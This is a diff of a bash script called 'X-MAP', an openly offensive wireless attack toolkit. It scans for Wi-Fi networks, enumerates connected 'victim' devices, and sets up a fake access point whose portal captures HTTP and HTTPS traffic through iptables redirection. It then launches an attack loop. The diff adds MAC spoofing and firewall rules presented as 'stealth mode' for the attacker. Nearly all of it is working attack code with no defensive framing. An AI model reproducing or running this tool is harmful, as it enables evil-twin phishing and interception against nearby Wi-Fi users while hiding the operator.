@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ==========================================
-#   X-MAP (Cinematic Terminal Edition - 2.4G & 5G)
+#   X-MAP (Cinematic Terminal Edition - Secure)
 # ==========================================
 
 RED='\033[0;31m'
@@ -26,7 +26,7 @@ cat << "EOF"
 EOF
 echo -e "\e[38;5;129m"
 echo "  ==============================================="
-echo -e "${PURPLE}   [ Wireless Recon & Attack Toolkit | v1.0.0 ]${NC}"
+echo -e "${PURPLE}   [ Wireless Recon & Attack Toolkit | v2.2 ]${NC}"
 echo -e "\e[38;5;129m"
 echo "  ==============================================="
 echo -e "${NC}"
@@ -39,14 +39,29 @@ fi
 
 # 1. Cleanup
 echo -e "${YELLOW}[*] Cleaning up interfaces...${NC}"
-sudo killall hostapd dnsmasq aireplay-ng 2>/dev/null
+sudo killall hostapd dnsmasq aireplay-ng airodump-ng 2>/dev/null
 sudo iptables -t nat -F 2>/dev/null
 sudo ip link set wlan1 down 2>/dev/null
 sleep 2
 
+# 2. Light Ghost Mode (MAC Spoof & Firewall)
+echo -e "${YELLOW}[*] Activating Secure Mode (Ghost Mode)...${NC}"
+# MAC Randomization with a 3-second wait for driver stabilization
+sudo macchanger -r wlan1 > /dev/null 2>&1
+sleep 3
+
+# Block external Pings & Port 80, but allow internal Fake AP traffic
+sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
+sudo iptables -A INPUT -p tcp --dport 80 -i wlan1 -j ACCEPT
+sudo iptables -A INPUT -p tcp --dport 80 -j DROP
+sudo iptables -A INPUT -p tcp --dport 443 -i wlan1 -j ACCEPT
+sudo iptables -A INPUT -p tcp --dport 443 -j DROP
+echo -e "${GREEN}[+] Stealth Mode Activated. You are now invisible.${NC}"
+sleep 2
+
 # MAIN MENU LOOP
 while true; do
-    # 2. Select Band (2.4G or 5G)
+    # 3. Select Band (2.4G or 5G)
     echo ""
     echo -e "${CYAN}[?] Select Scan Band:${NC}"
     echo -e "    ${YELLOW}[1]${NC} 2.4 GHz (Channels 1-14)"
@@ -73,7 +88,7 @@ while true; do
 
     sudo rm -f /tmp/scan-01.csv /tmp/victims-01.csv
     
-    # FIXED: Background scan to ensure file saves properly
+    # Background scan
     sudo airodump-ng --band $SCAN_BAND wlan1 -w /tmp/scan --output-format csv > /dev/null 2>&1 &
     AIRO_PID=$!
     sleep 20
@@ -92,11 +107,11 @@ while true; do
 
     # Styled Table Header
     echo ""
-    echo -e "${CYAN}  ╭──────────────────────────────────────────────────────────╮${NC}"
+    echo -e "${CYAN}  ┌────────────────────────────────────────────────────────┐${NC}"
     echo -e "${CYAN}  │${PURPLE}                  DETECTED WIFI TARGETS                   ${CYAN}│${NC}"
-    echo -e "${CYAN}  ├─────┬──────────────────────┬─────┬────────┬───────────────┤${NC}"
-    echo -e "${CYAN}  │${YELLOW} No  │ BSSID                │ CH  │ SIGNAL │ ESSID         ${CYAN}│${NC}"
-    echo -e "${CYAN}  ├─────┼──────────────────────┼─────┼────────┼───────────────┤${NC}"
+    echo -e "${CYAN}  ├─────┬────────────────────────┬─────┬────────┬───────────────┤${NC}"
+    echo -e "${CYAN}  │${YELLOW} No  │ BSSID                  │ CH  │ SIGNAL │ ESSID         ${CYAN}│${NC}"
+    echo -e "${CYAN}  ├─────┼────────────────────────┼─────┼────────┼───────────────┤${NC}"
 
     if [ -f /tmp/scan-01.csv ]; then
         while IFS=',' read -r bssid f1 f2 ch f3 f4 f5 f6 pwr f7 f8 f9 f10 essid rest; do
@@ -124,7 +139,7 @@ while true; do
         echo -e "${CYAN}  │${RED}      Failed to capture network scan file.                 ${CYAN}│${NC}"
     fi
     
-    echo -e "${CYAN}  ╰─────┴──────────────────────┴─────┴────────┴───────────────╯${NC}"
+    echo -e "${CYAN}  └─────┴────────────────────────┴─────┴────────┴───────────────┘${NC}"
     echo ""
 
     if [ $INDEX -eq 1 ]; then
@@ -133,7 +148,7 @@ while true; do
         continue
     fi
 
-    # 3. Select Target Network
+    # 4. Select Target Network
     while true; do
         echo ""
         read -p "$(echo -e ${CYAN}"[?] Select target network number (or 'back' to rescan): "${NC})" TARGET_INPUT
@@ -161,7 +176,7 @@ while true; do
 
     echo -e "${GREEN}[+] Target Locked: $T_ESSID ($T_BSSID) on Channel $T_CH${NC}"
 
-    # 4. Scan Victims on Target Channel
+    # 5. Scan Victims on Target Channel
     echo -e "${CYAN}[*] Sniffing connected devices on $T_ESSID (20 seconds)...${NC}"
     sudo ip link set wlan1 down
     sudo iw dev wlan1 set type monitor
@@ -171,7 +186,6 @@ while true; do
 
     sudo rm -f /tmp/victims-01.csv
     
-    # FIXED: Background scan for victims
     sudo airodump-ng wlan1 --bssid $T_BSSID -c $T_CH -w /tmp/victims --output-format csv > /dev/null 2>&1 &
     VIC_PID=$!
     sleep 20
@@ -187,11 +201,11 @@ while true; do
     declare -a V_PWR_ARR
 
     echo ""
-    echo -e "${CYAN}  ╭──────────────────────────────────────────────────────────╮${NC}"
+    echo -e "${CYAN}  ┌────────────────────────────────────────────────────────┐${NC}"
     echo -e "${CYAN}  │${PURPLE}                CONNECTED VICTIM DEVICES                  ${CYAN}│${NC}"
-    echo -e "${CYAN}  ├─────┬──────────────────────┬────────────┬───────────────┤${NC}"
-    echo -e "${CYAN}  │${YELLOW} No  │ MAC ADDRESS          │ SIGNAL PWR │ FRAMES        ${CYAN}│${NC}"
-    echo -e "${CYAN}  ├─────┼──────────────────────┼────────────┼───────────────┤${NC}"
+    echo -e "${CYAN}  ├─────┬────────────────────────┬────────────┬───────────────┤${NC}"
+    echo -e "${CYAN}  │${YELLOW} No  │ MAC ADDRESS            │ SIGNAL PWR │ FRAMES        ${CYAN}│${NC}"
+    echo -e "${CYAN}  ├─────┼────────────────────────┼────────────┼───────────────┤${NC}"
 
     if [ -f /tmp/victims-01.csv ]; then
         while IFS=',' read -r mac f1 pwr f2 frames rest; do
@@ -210,13 +224,13 @@ while true; do
         echo -e "${CYAN}  │${RED}      Failed to capture victim scan file.                 ${CYAN}│${NC}"
     fi
     
-    echo -e "${CYAN}  ╰─────┴──────────────────────┴────────────┴───────────────╯${NC}"
+    echo -e "${CYAN}  └─────┴────────────────────────┴────────────┴───────────────┘${NC}"
 
     if [ $V_INDEX -eq 1 ]; then
         echo -e "${RED}[!] No connected devices found or they are hidden.${NC}"
     fi
 
-    # 5. Victim Selection
+    # 6. Victim Selection
     while true; do
         echo ""
         echo -e "${CYAN}[?] Select Attack Strategy:${NC}"
@@ -256,10 +270,9 @@ while true; do
     fi
 done
 
-# 6. Auto Setup Configs
+# 7. Auto Setup Configs
 echo -e "${YELLOW}[*] Configuring Fake AP & Portal...${NC}"
 
-# Determine hw_mode based on channel
 if [ "$T_CH" -gt 14 ]; then
     HW_MODE="a" # 5GHz
 else
@@ -287,12 +300,12 @@ iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j DNAT --to-destinatio
 iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80
 systemctl restart apache2
 
-# 7. Start Attack Loop
+# 8. Start Attack Loop
 echo ""
-echo -e "${CYAN}  ╭──────────────────────────────────────────────────────────╮${NC}"
+echo -e "${CYAN}  ┌────────────────────────────────────────────────────────┐${NC}"
 echo -e "${CYAN}  │${RED}                 LAUNCHING SEQUENTIAL ATTACK              ${CYAN}│${NC}"
 echo -e "${CYAN}  │${PURPLE}                Press Ctrl+C to stop the attack            ${CYAN}│${NC}"
-echo -e "${CYAN}  ╰──────────────────────────────────────────────────────────╯${NC}"
+echo -e "${CYAN}  └────────────────────────────────────────────────────────┘${NC}"
 sleep 2
 
 while true; do
